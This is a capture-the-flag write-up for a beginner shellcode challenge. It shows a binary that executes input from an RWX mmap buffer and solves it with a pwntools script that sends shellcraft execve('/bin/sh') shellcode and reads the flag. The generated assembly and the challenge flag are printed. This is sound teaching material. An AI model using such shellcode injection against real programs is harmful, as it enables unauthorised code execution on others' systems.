# level-0

## Introduction

A pwnable passed down from my mentor, @huckfinn. This problem focuses on
creating shellcode.

## Information Gathering

### Hint #1

> This program will literally do anything you want it to do.

```shell
$ checksec ./level-0
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### Dynamic

If we run the program we see that the program is waiting for input. When we
enter the input, the program immediately segfaults. Given the hint, it makes me
think that this program is literally running the bytes given to it. Since
`test` doesn't correspond to valid instructions in amd64, the program dies.

```shell
$ ./level-0
test
Segmentation fault (core dumped)
```

### Static

We threw the program in Ghidra and this was the result after some cleanup.

```c
int main(void){
  code *__buf;

  init_chal();
  __buf = (code *)mmap((void *)0x0,0x1000,7,0x22,-1,0);
  read(0,__buf,4096);
  (*__buf)();
  return 0;
}
```

Notably, the `main` function is `mmap`ing the region of memory where `buf` is
with the following arguments: `mmap(addr=NULL, length=0x1000, prot=0x7,
flags=0x22, fd=0xfffffff, offset=0x0)`

The prot (protections) argument describes the desired memory protection of the
mapping. It is a bitwise OR of one or more of the following flags:

```c
#define PROT_READ	0x1		/* page can be read */
#define PROT_WRITE	0x2	   /* page can be written */
#define PROT_EXEC	0x4		/* page can be executed */
#define PROT_SEM	0x8		 /* page may be used for atomic ops */
#define PROT_NONE	0x0		/* page can not be accessed */
```

With a prot bitmask of 0x7 the memory location is set to read, write, and
execute. The combination of the latter two are particularly interesting when we
see that it is actually executing the contents of `buf` as though there are
instructions there. There currently aren't, but could there be?

Yes! We just need to send the program some shellcode to execute.

## Strategy

The idea is simple. We just need to write some shellcode to `execv` a shell. We
could do this by hand, which would be a great exercise, but we're going to
leverage `pwntool` to do the hard part for us.

With `pwntools` we can start our `shellcraft` module to launch a shell pretty
easily.

```python
exe = ELF('./level-0')
context.binary = exe
# Create the shellcode.
shellcode = shellcraft.sh()
```

What might trip you up is how the `shellcraft` module works. You typically need
to specify the architecture and the operating system such that is would
something like this:

```python
# Create the shellcode.
shellcode = shellcraft.amd64.linux.sh()
```

However, because we have set `context.binary` in our script, `pwntools` is
smart enough to figure that part out. Hopefully this saves you some heartache.

You can print out the result by calling `print(shellcode)` and see the
following assembly:

```asm
/* execve(path='/bin///sh', argv=['sh'], envp=0) */
/* push b'/bin///sh\x00' */
push 0x68
mov rax, 0x732f2f2f6e69622f
push rax
mov rdi, rsp
/* push argument array ['sh\x00'] */
/* push b'sh\x00' */
push 0x1010101 ^ 0x6873
xor dword ptr [rsp], 0x1010101
xor esi, esi /* 0 */
push rsi /* null terminate */
push 8
pop rsi
add rsi, rsp
push rsi /* 'sh\x00' */
mov rsi, rsp
xor edx, edx /* 0 */
/* call execve() */
push SYS_execve /* 0x3b */
pop rax
syscall
```

Now all that is left is to send it the program. We can't send the assembly
output as shown above; we need to convert it to the actual hexadecimal opcodes
that the program will run with the `asm` function. We can do that and send it
to the program. Putting it all together looks something like the following:

```python
# Pop a shell.
shellcode = shellcraft.sh()
io.sendline(asm(shellcode))

# Get the flag.
io.sendline("cat flag.txt")
flag = io.recvline()
log.success(f"Flag: {flag}")
```

## The Solution

You should be able to run the script like so and get the flag!

```shell
$ python3 ./solve.py
[+] Flag: b'flag{RememberAllIAmOfferingIsTheTruth}\n'
[+] Time: 0.1028270721435546
```

## Mitigations

I won't even discuss exploitation mitigations since the develops purposefully
made `buf` RWX. :)
